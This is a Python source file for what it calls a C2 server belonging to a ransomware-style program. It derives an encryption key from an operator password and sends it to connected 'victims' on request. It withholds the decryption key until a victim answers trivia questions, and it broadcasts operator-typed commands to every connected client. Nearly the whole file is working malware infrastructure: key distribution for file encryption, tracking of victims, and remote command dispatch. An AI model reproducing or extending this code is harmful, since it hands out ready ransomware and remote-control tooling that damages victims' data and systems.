import threading
import socket
import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import enum

HOST = "127.0.0.1"
PORT = 4444
CLIENT_HANDLER_THREADS = list()
CLIENT_SOCKETS = list()

QUESTIONS = {
    "What is the capital of France?": "Paris",
    "What is 2 + 2?": "4",
    "Who is the best hacker in the world?": "LordKing",
}

class Requests(enum.Enum):
    ENCRYPT = "ENCRYPT"
    CHECK_ANSWERS = "CHECK_ANSWERS"
    ANSWER_VERIFICATION = "ANSWER_VERIFICATION"
    NOT_ENOUGH_CORRECT_ANSWERS = "NOT_ENOUGH_CORRECT_ANSWERS"
    REQUEST_DECRYPTION_KEY = "REQUEST_DECRYPTION_KEY"
    EXIT = "EXIT"

# dictionary containing IP addresses of victims and their correct answers count
VICTIM_CORRECT_ANSWERS_COUNTER = {}

def verify_answers(question: str, answer: str, victim_addr) -> bool:
    global VICTIM_CORRECT_ANSWERS_COUNTER
    if victim_addr not in VICTIM_CORRECT_ANSWERS_COUNTER:
        print("Victim address not found in correct answers dictionary.")
        return False
    
    if question in QUESTIONS and QUESTIONS[question].lower() == answer.lower():
        VICTIM_CORRECT_ANSWERS_COUNTER[victim_addr] += 1
        print(f"Victim {victim_addr} answered correctly. Total correct answers: {VICTIM_CORRECT_ANSWERS_COUNTER[victim_addr]}")
        return True
    return False

def generate_key_from_password(password: str, salt: bytes = None) -> tuple:
    if salt is None:
        salt = os.urandom(16)
    
    # Use PBKDF2 to derive a key from the password
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=480000,  # High iteration count for security
    )
    
    key = kdf.derive(password.encode())
    return key, salt


def handle_client(client_socket: socket, key: bytes, salt: bytes):
    try:
        while True:
            #receive question from client
            request = client_socket.recv(1024).decode()
            if not request:
                print(f"Client {client_socket.getpeername()} disconnected.")
                break
            print(f"Received request from {client_socket.getpeername()}: {request}")
            if request.startswith(Requests.CHECK_ANSWERS.value):
                print("Received a request to check an answer")
                _, question, answer = request.split(":", 2)
                response = verify_answers(question, answer, client_socket.getpeername())
                client_socket.send(f"ANSWER_VERIFICATION:{response}".encode())
            elif request.startswith(Requests.ENCRYPT.value):
                print("Someone clicked the wrong button :D")
                payload = base64.b64encode(key) + b"::" + base64.b64encode(salt)
                client_socket.send(payload)
            elif request.startswith(Requests.REQUEST_DECRYPTION_KEY.value):
                print("Received request for decryption key")
                if VICTIM_CORRECT_ANSWERS_COUNTER.get(client_socket.getpeername(), 0) >= len(QUESTIONS):
                    print("Sending the decryption key")
                    payload = base64.b64encode(key) + b"::" + base64.b64encode(salt)
                    client_socket.send(payload)
                else:
                    print("Someone tried to request the decryption key without completing the minigame")
                    client_socket.send(Requests.NOT_ENOUGH_CORRECT_ANSWERS.value.encode())
            elif request.startswith(Requests.EXIT.value):
                print(f"Client {client_socket.getpeername()} requested to exit. (His loss :D)")
                break
            else:
                print(f"Unknown request from {client_socket.getpeername()}: {request}")

    except Exception as e:
        print(f"Error handling client: {str(e)}")
    finally:
        print(f"Closing connection with client: {client_socket.getpeername()}")
        client_socket.close()

def execute_command(command: str):
    for client in CLIENT_SOCKETS:
        client.send(command.encode())

def instruction_handler():
    user_input = input("Enter command to execute on clients: ")
    while user_input.lower() != "exit":
        execute_command(user_input)
        user_input = input("Enter command to execute on clients: ")

def main():
    print("Starting C2 server...")

    #generate encryption key
    user_input = input("Enter encryption password for the victims: ")
    key, salt = generate_key_from_password(user_input)

    instruction_handler_thread = threading.Thread(target=instruction_handler)
    instruction_handler_thread.start()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)

    global CLIENT_HANDLER_THREADS
    global CLIENT_SOCKETS
    print(f"Server listening on {HOST}:{PORT}")

    try:
        while True:
            client_socket, addr = server_socket.accept()
            print(f"Connection from {addr}")

            CLIENT_HANDLER_THREADS.append(threading.Thread(target=handle_client, args=(client_socket,key, salt)))
            CLIENT_HANDLER_THREADS[-1].start()
            VICTIM_CORRECT_ANSWERS_COUNTER[addr] = 0
            CLIENT_SOCKETS.append(client_socket)
    
    except Exception as e:
        print("Exception: " + str(e))
    finally:
        server_socket.close()
if __name__ == "__main__":
    main()